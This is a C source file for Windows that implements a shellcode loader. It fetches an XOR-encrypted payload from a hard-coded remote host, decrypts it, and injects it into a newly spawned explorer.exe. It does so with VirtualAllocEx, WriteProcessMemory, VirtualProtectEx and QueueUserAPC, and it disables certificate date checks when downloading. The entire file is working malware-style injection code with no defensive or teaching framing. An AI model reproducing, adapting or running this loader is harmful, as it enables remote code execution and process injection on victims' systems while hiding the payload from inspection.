#include <windows.h>
#include <stdio.h>
#include <wininet.h>

#pragma comment (lib, "wininet.lib")

#ifndef PAYLOAD
#define PAYLOAD	L"http://192.168.21.237:8000/encrypted_shellcode.bin"
#endif

#ifndef API_KEY
#define API_KEY "asdasd"
#endif


void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}
BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    BOOL		bSTATE = TRUE;

    HINTERNET	hInternet = NULL,
        hInternetFile = NULL;

    DWORD		dwBytesRead = 0;

    SIZE_T		sSize = 0; 	 			

    PBYTE		pBytes = NULL,					
        pTmpBytes = NULL;					


    hInternet = InternetOpenW(L"User1337Agent", 0, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hInternetFile == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }


    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    while (TRUE) {

      
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
            bSTATE = FALSE; goto _EndOfFunction;
        }

     
        sSize += dwBytesRead;

       
        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
           
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            bSTATE = FALSE; goto _EndOfFunction;
        }


        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);


        memset(pTmpBytes, '\0', dwBytesRead);

       
        if (dwBytesRead < 1024) {
            break;
        }


    }



    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);											
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);										
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	
    if (pTmpBytes)
        LocalFree(pTmpBytes);													
    return bSTATE;
}

int main() {

    char key[] = API_KEY;

    SIZE_T	Size = 0;
    PBYTE	Bytes = NULL;


    // Reading the payload 
    GetPayloadFromUrl(PAYLOAD, &Bytes, &Size);






    
STARTUPINFOW si;
PROCESS_INFORMATION pi;

ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);

ZeroMemory(&pi, sizeof(pi));
    LPVOID ptr;


    wchar_t cmd[] = L"explorer.exe";

    // Create the process (notepad.exe)
    CreateProcessW(
    NULL,
    cmd,
    NULL,
    NULL,
    FALSE,
    0,
    NULL,
    NULL,
    &si,
    &pi
);

    // Allocate memory for the shellcode in the target process
    ptr = VirtualAllocEx(
        pi.hProcess,
        NULL,
        Size,              // Use actual shellcode size
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );


    // XOR the shellcode with the key
    XOR((char*)Bytes, Size, key, sizeof(key));
    SIZE_T bytesWritten = 0;

    // Write the XOR'd shellcode into the allocated memory
    WriteProcessMemory(
        pi.hProcess,
        ptr,                   // Target process memory location
        Bytes,             // Source shellcode
        Size,             // Size of shellcode
        &bytesWritten);
    

    // Change memory protection to allow code execution
    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, ptr, Size, PAGE_EXECUTE_READ, &oldProtect);

    // Queue the APC to execute the shellcode in the target process
	QueueUserAPC((PAPCFUNC)ptr, pi.hThread, 0);

    // Resume the target process to execute the shellcode
    ResumeThread(pi.hThread);

    // Optionally wait for the process to complete
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up allocated memory and close handles
    VirtualFreeEx(pi.hProcess, ptr, 0, MEM_RELEASE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
